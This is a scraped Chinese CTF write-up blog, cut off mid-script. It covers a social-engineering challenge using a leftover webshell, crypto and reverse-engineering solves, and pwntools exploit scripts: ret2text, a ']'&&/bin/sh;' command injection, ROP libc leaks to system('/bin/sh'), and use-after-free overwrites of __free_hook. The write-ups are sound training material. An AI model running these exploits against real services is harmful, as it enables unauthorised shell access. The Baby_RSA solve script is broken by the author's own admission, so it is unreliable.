title="社工四：反击黑客"></a>社工四：反击黑客</h3><p>这个👴🏻没有做出来，但是👴🏻不知道哪里不对，先记录一下8</p><p>进了后台，用msf连接shell不就行了</p><p>然后找到了这个udf.php，有不会修电脑师傅留下的后门，这不直接拿来用一波</p><p>然后尝试查看backup发现disable_function给ban了好多system之类的东西，算了，再看看别的目录</p><p>然后发现了这个</p><p><img src="https://i.loli.net/2021/05/23/klZN8cqTEMKp2Qg.png" style="zoom:50%;" /></p><p>芜湖，然后邮箱密码就拿到了，用带黑客的ProtonMail邮箱登进去，发现坚果云2333</p><p><img src="https://i.loli.net/2021/05/23/pxSX9ogACfr5BY1.png" style="zoom:50%;" /></p><p>发现带黑客的身份证，那按理来说黑客就住在下北泽？但是flag不对</p><p><img src="https://i.loli.net/2021/05/23/QXrWPYkZ62uTCNs.png" style="zoom:50%;" /></p><p>所以👴🏻百度百科查到了下北泽的各种叫法和下北泽在日本的具体位置，都不对，算了，不做了，补作业去了（x</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm-up"></a>warm-up</h3><p>直接在console里调用js代码即可弹出flag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="WHATS-HAPPEN"><a href="#WHATS-HAPPEN" class="headerlink" title="WHATS HAPPEN?"></a>WHATS HAPPEN?</h3><p>简单的盲文，找个在线解密的一把梭就好了</p><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby_RSA"></a>Baby_RSA</h3><p>虽然没有做出来，但是感觉思路没问题，先填个坑，不知道中间哪一步错了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_prime</span>(<span class="params">bits</span>):</span></span><br><span class="line">  <span class="keyword">return</span> sympy.randprime(<span class="number">2</span>**(bits-<span class="number">1</span>), <span class="number">2</span>**bits)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>(<span class="params">bits</span>):</span></span><br><span class="line">    p = get_random_prime(bits)</span><br><span class="line">    q = get_random_prime(bits)</span><br><span class="line">    r = get_random_prime(bits)</span><br><span class="line">    e = get_random_prime(<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">assert</span> gcd(e,phi)==<span class="number">1</span></span><br><span class="line">    d=invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)//gcd(p-<span class="number">1</span>,(gcd(q-<span class="number">1</span>,r-<span class="number">1</span>))))</span><br><span class="line">    <span class="keyword">return</span> (e,d,p*q*r)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg,e,n</span>):</span></span><br><span class="line">    cipher=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;nflag.enc&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">hex</span>(cipher)[<span class="number">2</span>:])</span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_pubkey</span>(<span class="params">n,e</span>):</span></span><br><span class="line">    pubkey = RSA.construct((n,e))</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">r&#x27;npubkey.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(pubkey.export_key())</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">e,d,n=gen_key(<span class="number">256</span>)</span><br><span class="line">export_pubkey(n,e)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;d:&quot;</span>,d)</span><br><span class="line"><span class="comment">#d:6848345389131232097250291554774004483864247462767351912899751705063009304102012225840379809975695209148626539132005837425458215616241927473070938221119168859672496841054510245128799501775634965114887272776082740599056090759932017</span></span><br><span class="line">encrypt(flag,<span class="number">7</span>,n)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先给了d，解出来pq，然后加密的时候又把e换成了7</p><p>但是解的时候解不出来，不知道哪里错了，orz</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xcd2e55e25e84bd7e050e4e28e0725f2b02442e2d55fcc8053f53811610b7a8e1d3aa2d3f3e3923d3f5ad20e00fbe532b255768d77d9e07fc23bbc6c039d741d9</span></span><br><span class="line">q = <span class="number">0xa170bce7723a072e1cfa7b466916939df85d1b97d29c73d5f3cdd8cf49f8194f</span></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">c = <span class="number">0x3773fd7f928a0231c0a26e48678984fc36db84f4d63de0cdb36a3101e6e48e140a21b6a6fae834dfaa2670d36444a5f002d28a5d4a9efb6822af43d4d98f4aa9a18139b76527049d2c4419d7ad4ddd9ef65ec7176842aa9ced2f8b14af7bf731</span></span><br><span class="line">s = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = long(gmpy2.invert(e, s))</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">pow</span>(c, e, d))</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-sender"><a href="#easy-sender" class="headerlink" title="easy_sender"></a>easy_sender</h3><p>签到题，ret2text</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./easysender&#x27;</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p64(<span class="number">0x080491B6</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strread"><a href="#strread" class="headerlink" title="strread"></a>strread</h3><p>有web内味了，尝试用单引号和分号闭合，payload是试出来的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./white&#x27;</span></span><br><span class="line">port = <span class="number">10002</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Path to follow:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;]&#x27;&amp;&amp;/bin/sh;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strlenvsread"><a href="#strlenvsread" class="headerlink" title="strlenvsread"></a>strlenvsread</h3><p><img src="https://i.loli.net/2021/05/22/ZUKae2Nf7WwczAu.png" alt=""></p><p>漏洞点在于strlen读取的长度可以被00截断，但是read的返回值不可以，溢出就完事了嗷</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./strlenvsread&#x27;</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Neo, enter your matrix: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Make your choice: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="MEGA-RACE"><a href="#MEGA-RACE" class="headerlink" title="MEGA-RACE"></a>MEGA-RACE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">scram</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    flag[i] ^= <span class="number">0x77</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的异或，写个脚本简单解密即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> pass[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x1B</span>, <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x0D</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x0E</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x28</span>, <span class="number">0x16</span>, <span class="number">0x05</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x1F</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x30</span>, <span class="number">0x22</span>, <span class="number">0x2E</span>, <span class="number">0x56</span>, <span class="number">0x0A</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="built_in">strlen</span>(pass);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pass[i] = pass[i] ^ <span class="number">0x77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(pass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-py"><a href="#easy-py" class="headerlink" title="easy_py"></a>easy_py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># while None:</span></span><br><span class="line"><span class="comment">#     Happy = [</span></span><br><span class="line"><span class="comment">#         39,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         8,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         51,</span></span><br><span class="line"><span class="comment">#         70,</span></span><br><span class="line"><span class="comment">#         21,</span></span><br><span class="line"><span class="comment">#         65,</span></span><br><span class="line"><span class="comment">#         11,</span></span><br><span class="line"><span class="comment">#         112,</span></span><br><span class="line"><span class="comment">#         22,</span></span><br><span class="line"><span class="comment">#         111,</span></span><br><span class="line"><span class="comment">#         33,</span></span><br><span class="line"><span class="comment">#         82,</span></span><br><span class="line"><span class="comment">#         93,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         72,</span></span><br><span class="line"><span class="comment">#         77,</span></span><br><span class="line"><span class="comment">#         125,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         74,</span></span><br><span class="line"><span class="comment">#         27,</span></span><br><span class="line"><span class="comment">#         98,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         87,</span></span><br><span class="line"><span class="comment">#         0,</span></span><br><span class="line"><span class="comment">#         95,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         117,</span></span><br><span class="line"><span class="comment">#         42,</span></span><br><span class="line"><span class="comment">#         122,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         103,</span></span><br><span class="line"><span class="comment">#         88]</span></span><br><span class="line"><span class="comment">#     num = 37</span></span><br><span class="line"><span class="comment">#     f = input(&#x27;Please input your flag:&#x27;)</span></span><br><span class="line"><span class="comment">#     if len(f) != 38:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Your input is illegal&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     flag = list(f)</span></span><br><span class="line"><span class="comment">#     j = 0</span></span><br><span class="line"><span class="comment">#     for i in flag:</span></span><br><span class="line"><span class="comment">#         flag[j] = ord(i)</span></span><br><span class="line"><span class="comment">#         j += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     t1 = threading.Thread(encode_1, (1,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t2 = threading.Thread(encode_2, (2,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t1.start()</span></span><br><span class="line"><span class="comment">#     time.sleep(0.5)</span></span><br><span class="line"><span class="comment">#     t2.start()</span></span><br><span class="line"><span class="comment">#     t1.join()</span></span><br><span class="line"><span class="comment">#     t2.join()</span></span><br><span class="line"><span class="comment">#     if flag == Happy:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Good job!&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     print(&#x27;No no no!&#x27;)</span></span><br></pre></td></tr></table></figure><p>是个多线程，encode函数是简单的异或</p><p>简单写个解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    flag = [</span><br><span class="line">        <span class="number">39</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">51</span>,</span><br><span class="line">        <span class="number">70</span>,</span><br><span class="line">        <span class="number">21</span>,</span><br><span class="line">        <span class="number">65</span>,</span><br><span class="line">        <span class="number">11</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">33</span>,</span><br><span class="line">        <span class="number">82</span>,</span><br><span class="line">        <span class="number">93</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">77</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">74</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">98</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">87</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">42</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">88</span>]</span><br><span class="line"></span><br><span class="line">    templist = [<span class="number">0</span>] * <span class="number">38</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ flag[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># flag = templist</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        templist[i] = <span class="built_in">chr</span>(templist[i])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(templist))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn系列2</title>
      <link href="2021/05/11/pwn2/"/>
      <url>2021/05/11/pwn2/</url>
      
        <content type="html"><![CDATA[<h3 id="rootersctf-2019-babypwn"><a href="#rootersctf-2019-babypwn" class="headerlink" title="rootersctf_2019_babypwn"></a>rootersctf_2019_babypwn</h3><ul><li>考点：栈溢出，ropgadget，leak libc，ubuntu18字节对齐</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./rootersctf_2019_babypwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="number">29701</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401223</span></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want me to echo back&gt; &quot;</span>)</span><br><span class="line">payload = <span class="number">0x100</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x401146</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC BASE:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_addr)))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">bss_base = <span class="number">0x404040</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sh = libc_addr + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = <span class="number">0x108</span> * <span class="string">b&#x27;a&#x27;</span> + p64(ret) + p64(pop_rdi_ret) + p64(sh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="xm-2019-awd-pwn2"><a href="#xm-2019-awd-pwn2" class="headerlink" title="xm_2019_awd_pwn2"></a>xm_2019_awd_pwn2</h3><ul><li>考点：uaf</li></ul><p>简单的uaf</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./xm_2019_awd_pwn2&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="number">27761</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">s, addr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span> % (s, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;b\n&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_addr = u64(p.recvuntil(</span><br><span class="line">    <span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">echo(<span class="string">&quot;libc&quot;</span>, libc_addr)</span><br><span class="line">__free_hook = libc_addr + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(__free_hook) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a>gyctf_2020_document</h3><ul><li>考点：<ul><li>uaf</li><li>unsorted bin</li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./gyctf_2020_document&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &#x27;/glibc/2.23/64/lib/libc-2.23.so&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.23.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="string">&quot;aaaaaaaa&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">    add(<span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="string">&quot;W&quot;</span>, <span 